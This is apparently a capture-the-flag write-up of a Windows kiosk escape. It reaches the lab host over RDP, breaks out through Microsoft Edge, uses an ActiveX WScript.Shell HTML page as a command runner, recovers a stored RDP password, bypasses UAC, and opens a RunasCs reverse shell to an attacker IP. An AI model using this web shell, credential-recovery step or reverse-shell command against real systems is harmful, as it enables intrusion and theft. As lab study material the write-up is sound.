I don't always scan ports, but when I do, I prefer RustScan.

[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 65435'.

## User
Only `RDP` port is open, let's try connecting.
```
└─$ xfreerdp /v:10.10.125.141 /dynamic-resolution +clipboard -sec-nla
```

Seems like a [KIOSK](https://book.hacktricks.xyz/hardware-physical-access/escaping-from-gui-applications)

![](1.png)

Enter username: `KiosUser0` ana empty password. Then we can press `WIN` button and search for `Edge`/`Internet`, and open `Microsoft Edge`

![](2.png)

From there we can navigate to `file://C:/` which will show us content of `C:` drive. Now we can retrieve user flag.

![](3.png)


## Root
Now we need to get reverse shell. There is a nice [blog](https://blog.nviso.eu/2022/05/24/breaking-out-of-windows-kiosks-using-only-microsoft-edge/) regarding gaining RCE in KIOSK.

First we can download `cmd.exe` from `C:\Windows\System32\`, then rename it to `msedge.exe` (since it's name is in the whitelist). After downloading open location of the file and then press `F2` to rename it.

![](4.png)

![](5.png)

Another way would be to upload the following script
```
<html>
<body>
    <script>
    function shlExec() {
        var cmd = document.getElementById('cmd').value
        var shell = new ActiveXObject("WScript.Shell");
        try {
            var execOut = shell.Exec("cmd.exe /C \"" + cmd + "\"");
        } catch (e) {
            console.log(e);
        }

        var cmdStdOut = execOut.StdOut;
        var out = cmdStdOut.ReadAll();
        alert(out);
    }
</script>

<form onsubmit="shlExec()">
    Command: <input id="cmd" name="cmd" type="text">
    <input type="submit">
</form> 
</body>
</html>
```

Then in `msedge`, navigate to `Settings > Default browser` and set `Allow sites to be reloaded in Internet Explorer mode` to `Allow` open this file. Set url to `file:///C:/Users/kioskUser0/Downloads/pwn.html`

![](6.png)

Now, we have to create this file. We can do it via developer tools

![](7.png)

Click `Edit as HTML` and delete everything. Paste the snippet above.

![](8.png)

Now save it as `pwn.html` (`CTRL+S`)

![](9.png)

Visit page `file:///C:/Users/kioskUser0/Downloads/pwn.html`. We should allow blocked content (popup down below)

![](10.png)

Then we run our command. Click `Yes` in popup window (it will appear every time we execute command)

![](11.png)

And we see results in another window popup

![](12.png)

Okay, let's continue with privilege escalation. I'll use `cmd` approach. We find interesting `_admin` folder with `profiles.xml` file in it

![](13.png)

![](14.png)

The file is related to `Remote Desktop Plus` which is located in `C:\Program Files (x86)\Remote Desktop Plus`

![](15.png)

First, we can try opening it with `rdp.exe` by importing the profile. Thus copy the profile to `Downloads` folder and then run `rdp.exe`

![](16.png)

Now, open the `rdp.exe` and import the profile

![](17.png)


Notice that the password is obfuscated. Thus, we need [BullePassView](https://www.nirsoft.net/utils/bullets_password_view.html), which  is a password recovery tool that reveals the passwords stored behind the bullets in the standard password text-box of Windows operating system and Internet Explorer Web browser. When we click `Edit` on profile, `BullePassView` will display the password in the plaintext

![](18.png)


Now we have `admin` user from `Administrators` group. So, now we can either use [RunasCS](https://github.com/antonioCoco/RunasCs) and receive reverse shell, or we can simply use `runas` from `cmd.exe`. Let's try with `runas`. We run `runas /user:ESCAPE\admin cmd`, and see that the process is running in medium integrity level.


![](20.png)

To bypass UAC, we can simply start `Start-Process powershell -Verb runas` from powershell. We we get UAC dialog, where we click `Yes`. Now we have elevated process.

![](21.png)

![](22.png)

To run `RunasCS`, we need to download both `netcat` and tools itself.

![](19.png)

Then we have to run the following command
```
.\r.exe admin <REDACTED> -r 10.8.4.147:9000 cmd.exe --bypass-uac  
```

![](23.png)

And we receive our shell
